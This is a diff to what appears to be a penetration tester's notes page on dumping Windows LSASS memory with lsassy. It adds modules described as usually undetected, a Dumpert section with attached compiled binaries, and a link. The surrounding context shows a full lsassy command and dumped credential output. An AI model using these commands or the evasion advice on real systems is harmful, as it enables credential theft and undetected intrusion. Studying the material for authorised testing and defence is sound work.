@@ -103,6 +103,14 @@ $ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' 10.10.10
 
 #### Dump lsass with module
 
+Modules that can be used without prerequisites and from experience are not generally detected:
+
+* comsvcs_stealth
+* procdump_embedded
+* mirrordump_embedded
+
+##### comsvcs_stealth
+
 ```plain
 $ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
 [+] 10.10.10.10 Authentication successful
@@ -116,6 +124,11 @@ $ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
 [+] 10.10.10.10 offsec.nl\PDC01$  [PWD] c1e3cebd8f9628c752b34ca1290d8771cb159fedb2298219f7[...SNIP...]28bc2fe4ddc56b0e98a019bb072
 ```
 
+##### Dumpert
+
+{{%attachments title="Compiled binaries" fa_icon_class="far fa-file" pattern=".*(exe|dll)"/%}}
+
 ### URL list
 
 * [GitHub.com - lsassy](https://github.com/Hackndo/lsassy)
+* [Github.com - Dumpert](https://github.com/outflanknl/Dumpert)
